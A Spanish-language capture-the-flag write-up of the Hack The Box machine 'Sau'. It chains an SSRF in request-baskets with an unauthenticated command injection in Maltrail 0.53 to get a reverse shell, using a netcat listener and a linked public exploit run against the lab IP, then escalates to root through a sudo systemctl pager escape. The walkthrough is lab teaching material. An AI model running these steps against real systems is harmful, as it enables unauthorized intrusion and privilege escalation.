

![1](</Writeups/Machines/Sau/img/logo.png>)
By Rug4lo

## Reconocimiento

Primero que todo vamos a empezar con el reconocimiento de la maquina:

Vamos a escanear los puertos de esta con Nmap:
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.224
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-23 18:13 CEST
Initiating SYN Stealth Scan at 18:13
Scanning 10.10.11.224 [65535 ports]
Discovered open port 22/tcp on 10.10.11.224
Discovered open port 55555/tcp on 10.10.11.224
Completed SYN Stealth Scan at 18:13, 14.79s elapsed (65535 total ports)
Nmap scan report for 10.10.11.224
Host is up, received user-set (0.11s latency).
Scanned at 2023-08-23 18:13:31 CEST for 15s
Not shown: 65531 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
55555/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.93 seconds
           Raw packets sent: 72852 (3.205MB) | Rcvd: 72849 (2.914MB)
```
Podemos comprobar que la maquina tiene el puerto 22 y el 55555 abiertos

En el 55555 tiene alojada una web 

![1](</Writeups/Machines/Sau/img/1.png>)

Esta pagina nos deja crear unas "baskets" con las cuales podemos inspeccionar las peticiones que se hagan a estas mismas por HTTP

![1](</Writeups/Machines/Sau/img/2.png>)

## Explotación SSRF

Después de buscar un rato te puedes dar cuenta que en el botón de configuración nos abre una pestaña en la cual podemos configurar la respuesta del servidor

Si interceptamos esta petición con Burpsuite, podremos ver como se tramita esta misma

![1](</Writeups/Machines/Sau/img/3.png>)

Después de buscar alguna vulnerabilidad que funcione para este caso encontré esta:

Vulnerabilidad ---> https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3

Aquí nos dice que usando el campo "forward_url" podemos ocasionar un SSRF 

Esto hará que cuando hagamos una petición a esta basket (en mi caso rugalo) nos mande a la url que pongamos en el campo "forward_url" 

*Un apunte aquí es que es importante activar la respuesta del proxy, para que nos cargue la web que pusimos en es campo "forward_url"*

Ahora podemos poner en el campo "forward_url"  una url local (como puede ser 127.0.0.1):

![1](</Writeups/Machines/Sau/img/4.png>)

Si enviamos esta peticion y recargamos la pagina podemos ver que nos muestra una pagina web algo fea

![1](</Writeups/Machines/Sau/img/5.png>)

## Explotación Unauthenticated OS Command Injection

Podemos ver que esta web usa Maltrail, la version 0.53

Si buscamos en internet por vulnerabilidades para esta version encontraremos un Unauthenticated OS Command Injection

Vulnerabilidad ---> https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

Esa vulnerabilidad nos permite hacer ejecución de comandos aprovechándose de el login, mas concretamente el campo username

Por lo que podemos cambiar que estábamos poniendo en Burpsuite

![1](</Writeups/Machines/Sau/img/6.png>)

Buscando un poco mas encontré una herramienta que te automatiza la peticion para darte una reverse shell 

Script ---> https://github.com/spookier/Maltrail-v0.53-Exploit

Si nos ponemos en escucha con Netcat por cualquier puerto:
```bash
nc -nlvp 4646
```
Y usamos esta herramienta de esta manera:
- La primera ip es la nuestra junto al puerto que nos hemos puesto en escucha
- La segunda es a donde queremos tramitar la peticion
```bash
python3 exploit.py 10.10.14.26 4646 http://10.10.11.224:55555/rugalo
```
Al hacer esto nos tiene que haber dado una consola interactiva del usuario puma

Si nos vamos al home de este usuario ahí tendremos la primera flag

```
ls
```
```bash
lse.sh  user.txt
```
## Escalada de privilegios 

Ahora que tenemos la primera flag tenemos que convertirnos en root para la segunda

Para esto fui probando, pero un comando me dio una respuesta que no esperaba
```bash
sudo -l
```
```bash
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
Después de buscar un rato en internet me encontré con esta manera de escalar privilegios 

Pagina ---> https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/

Según esto podemos ejecutar el systemctl como root, y a partir de ahí conseguir una bash 

La manera de hacerlo seria poniendo este comando:
```bash
sudo /usr/bin/systemctl status trail.service
```
```bash
WARNING: terminal is not fully functional
-  (press RETURN)
```
Sin presionar RETURN ponemos !sh
```bash
-  (press RETURN)!sh
```
Esto nos dará una consola como administrador
```bash
whoami
```
```bash
root
```
Si nos vamos al home del root podremos ver la flag
```bash
ls
```
```bash
go  root.txt
```